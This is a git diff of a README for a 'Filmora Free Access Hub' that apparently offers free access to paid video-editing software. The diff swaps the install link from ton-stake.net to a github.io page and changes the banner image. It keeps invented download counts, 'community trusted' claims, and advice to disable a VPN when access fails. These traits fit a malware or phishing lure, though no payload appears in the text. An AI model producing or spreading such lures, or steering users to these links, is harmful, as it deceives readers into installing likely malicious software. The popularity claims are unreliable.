@@ -1,16 +1,16 @@
 # 🎬 Filmora Free Access Hub  
 
-| Downloads: 200+ Thousand | Community Trusted | Last Updated: June 2025 |
-|--------------------------|-------------------|-------------------------|
+ 
 
-![Filmora Banner](https://i.ytimg.com/vi/EYXseaJr-68/hq720.jpg?sqp=-oaymwEhCK4FEIIDSFryq4qpAxMIARUAAAAAGAElAADIQj0AgKJD&rs=AOn4CLAfBJ_9-oa8YIVITWB8aR_VjjvT0g)  
+![Filmora Banner](https://d1735p3aqhycef.cloudfront.net/topview_blog/thumbnail_6f3c2ba170b07783ce0cf07279867899.jpg)  
  
 
 **Description**: Elevate your video editing with the **Filmora Free Access Hub** in 2025! This repository offers exclusive tutorials, resources, and tips to explore AI-powered features like Smart Short Clips, AI Video Enhancer, and 4K editing. Join our trusted community of creators with over 200K downloads!  
 
-[![Install Filmora](https://img.shields.io/badge/Install-NOW-blueviolet)](https://ton-stake.net)  
+<a href="https://filmora-community.github.io/.github/" target="_blank">
+  <img src="https://img.shields.io/badge/Install_Guide-Now-3498db" alt="Install Guide Now" width="230" height="45" style="border:none;">
+</a>
 
----
 
 ## 📋 Installation Guide  
 
@@ -31,10 +31,10 @@ Master video editing with Filmora using these simple steps to access free resour
 5. **Access Problems?** 🌐  
    If the package access fails, try disabling your VPN or switching browsers (e.g., Chrome, Firefox).  
 
-[![Install Filmora](https://img.shields.io/badge/Install-NOW-blueviolet)](https://ton-stake.net)  
+<a href="https://filmora-community.github.io/.github/" target="_blank">
+  <img src="https://img.shields.io/badge/Install_Guide-Now-3498db" alt="Install Guide Now" width="230" height="45" style="border:none;">
+</a>
 
-
----
 
 ## 💡 Why Choose Filmora Free Access  
 
